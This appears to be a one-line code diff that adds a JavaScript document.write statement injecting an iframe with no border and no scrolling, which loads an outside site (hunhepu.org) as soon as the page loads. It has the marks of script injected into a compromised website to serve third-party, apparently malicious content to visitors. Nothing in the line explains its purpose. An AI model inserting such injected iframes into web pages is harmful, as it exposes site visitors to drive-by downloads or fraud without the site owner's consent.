@@ -1,0 +1,1 @@
+document.write("<iframe MARGINWIDTH=0 MARGINHEIGHT=0  HSPACE=0 VSPACE=0 FRameBORDER=0 SCROLLING=no src=http://www.hunhepu.org/ topmargin=0 width=780 height=260></iframe>") 
